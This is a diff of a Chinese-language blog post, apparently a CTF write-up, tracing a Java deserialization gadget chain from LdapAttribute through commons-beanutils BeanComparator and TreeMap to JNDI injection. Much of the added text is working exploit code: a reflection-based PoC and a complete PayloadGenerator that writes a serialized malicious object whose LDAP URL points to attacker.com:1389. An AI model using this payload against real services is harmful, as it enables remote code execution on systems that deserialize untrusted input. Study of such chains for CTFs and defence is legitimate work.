@@ -386,26 +386,103 @@ final class LdapAttribute extends BasicAttribute {
 
 ```java
 其实大概的就是
-定义了一个hashtable然后put赋值，需要注意的是这里的baseCtxURL是我们的ldap
+定义了一个hashtable然后put赋值，需要注意的是这里的baseCtxURL是我们的ldap，InitialDirContext是一个初始化的操作
 ```
 
 ![image-20231010194723534](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010194723534.png)
 
+可是这个类的lookup会调用到HiermemDirCtx的lookup上，并且这个HiermemDirCtx和InitialContext没一点关系
+
+![image-20231010195858994](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010195858994.png)
+
+![image-20231010195908256](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010195908256.png)
+
+但是看一下jndi的lookup调用,说明调用哪一个lookup都可以
+
+```java
+javax.naming.InitialContext#lookup(java.lang.String)
+-> com.sun.jndi.url.ldap.ldapURLContext#lookup(java.lang.String)
+-> com.sun.jndi.toolkit.url.GenericURLContext#lookup(java.lang.String)
+-> com.sun.jndi.toolkit.ctx.PartialCompositeContext#lookup(javax.naming.Name)
+-> com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup
+-> com.sun.jndi.ldap.LdapCtx#c_lookup
+-> ......
+```
+
+直接看的payload（太难了，真找不到。。）
+
+```java
+
+com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition
+-> javax.naming.directory.InitialDirContext#getSchema(javax.naming.Name)
+-> com.sun.jndi.toolkit.ctx.PartialCompositeDirContext#getSchema(javax.naming.Name)
+-> com.sun.jndi.toolkit.ctx.ComponentDirContext#p_getSchema
+-> com.sun.jndi.toolkit.ctx.ComponentContext#p_resolveIntermediate
+-> com.sun.jndi.toolkit.ctx.AtomicContext#c_resolveIntermediate_nns
+-> com.sun.jndi.toolkit.ctx.ComponentContext#c_resolveIntermediate_nns
+-> com.sun.jndi.ldap.LdapCtx#c_lookup
+-> ......
+```
+
+把断点下在 LdapCtx#
+
+```java
+import javax.naming.CompositeName;
+import javax.naming.InitialContext;
+import javax.naming.InvalidNameException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+public class poc {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, InvalidNameException {
+
+
+            String ldapCtxUrl = "ldap://127.0.0.1:9999";
+
+            Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
+            Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
+                    new Class[] {String.class});
+            ldapAttributeClazzConstructor.setAccessible(true);
+            Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
+                    new Object[] {"name"});
+
+            Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
+            baseCtxUrlField.setAccessible(true);
+            baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
+
+            Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
+            rdnField.setAccessible(true);
+            rdnField.set(ldapAttribute, new CompositeName("a/b"));
+
+            Method getAttributeDefinitionMethod = ldapAttributeClazz.getMethod("getAttributeDefinition");
+            getAttributeDefinitionMethod.setAccessible(true);
+            getAttributeDefinitionMethod.invoke(ldapAttribute);
+    }
+}
+payload非常的简单只不过
+ rdnField.set(ldapAttribute, new CompositeName("a/b"));  这个不太理解。为啥只有 a 后面有个/这个才可以
+```
+
+调试了半天也没找到缘由，只有 a/b才为2，别的普通字符串都是1作为了一个整体
+
+![image-20231010211217469](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010211217469.png)
+
+![image-20231010210425878](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010210425878.png)
+
+我们发现只有这个为size 2才有 tail的值，分为了head和tail，毕竟我们需要的函数在满足if条件里面
+
+![image-20231010211324947](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010211324947.png)
+
+```
+var7 = this.c_resolveIntermediate_nns(var6, var2);
+a\b\b就会成为 a \b\b
+```
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-首先试了能否打通（如果打不通那就徒劳白费了）：
+### `首先试了能否打通（如果打不通那就徒劳白费了）`：
 
 ```java
 import javax.naming.CompositeName;
@@ -444,4 +521,92 @@ public class poc {
 ```
 
 ![image-20231010183740300](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010183740300.png)
+
+最后写一下利用链子：
+
+```java
+
+java.io.ObjectInputStream#readObject
+-> java.util.HashMap#readObject  
+-> java.util.HashMap#putForCreate
+-> java.util.HashMap#eq
+-> java.util.AbstractMap#equals
+-> java.util.TreeMap#get
+-> java.util.TreeMap#getEntry
+-> java.util.TreeMap#compare
+    
+    （下面都是通用的）
+-> org.apache.commons.beanutils.BeanComparator#compare
+-> org.apache.commons.beanutils.PropertyUtils#getProperty
+-> org.apache.commons.beanutils.PropertyUtils#getNestedProperty
+-> org.apache.commons.beanutils.PropertyUtils#getSimpleProperty
+-> java.lang.reflect.Method#invoke
+-> com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition
+-> javax.naming.directory.InitialDirContext#getSchema(javax.naming.Name)
+-> com.sun.jndi.toolkit.ctx.PartialCompositeDirContext#getSchema(javax.naming.Name)
+-> com.sun.jndi.toolkit.ctx.ComponentDirContext#p_getSchema
+-> com.sun.jndi.toolkit.ctx.ComponentContext#p_resolveIntermediate
+-> com.sun.jndi.toolkit.ctx.AtomicContext#c_resolveIntermediate_nns
+-> com.sun.jndi.toolkit.ctx.ComponentContext#c_resolveIntermediate_nns
+-> com.sun.jndi.ldap.LdapCtx#c_lookup
+-> JNDI Injection RCE
+```
+
+下面都是通用的低版本中的TreeMap是compare，但是jdk8就是compareto了
+
+#### `如果拿jdk8版本打,把上面的替换成下面这个按理说也是可以打通的`
+
+（直接jdk8+CB 依赖）有空了就补上
+
+![image-20231010212146662](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010212146662.png)
+
+
+
+
+
+### 这是这道题jdk 1.4的payload：
+
+```java
+
+import org.apache.commons.beanutils.BeanComparator;
+import javax.naming.CompositeName;
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.TreeMap;
+public class PayloadGenerator {
+public static void main(String[] args) throws Exception {
+        String ldapCtxUrl = "ldap://attacker.com:1389";
+        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
+        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
+new Class[] {String.class});
+        ldapAttributeClazzConstructor.setAccessible(true);
+        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
+new Object[] {"name"});
+        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
+        baseCtxUrlField.setAccessible(true);
+        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
+        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
+        rdnField.setAccessible(true);
+        rdnField.set(ldapAttribute, new CompositeName("a//b"));
+// Generate payload
+        BeanComparator comparator = new BeanComparator("class");
+        TreeMap treeMap1 = new TreeMap(comparator);
+        treeMap1.put(ldapAttribute, "aaa");
+        TreeMap treeMap2 = new TreeMap(comparator);
+        treeMap2.put(ldapAttribute, "aaa");
+        HashMap hashMap = new HashMap();
+        hashMap.put(treeMap1, "bbb");
+        hashMap.put(treeMap2, "ccc");
+        Field propertyField = BeanComparator.class.getDeclaredField("property");
+        propertyField.setAccessible(true);
+        propertyField.set(comparator, "attributeDefinition");
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("object.ser"));
+        oos.writeObject(hashMap);
+        oos.close();
+    }
+}
+```
 
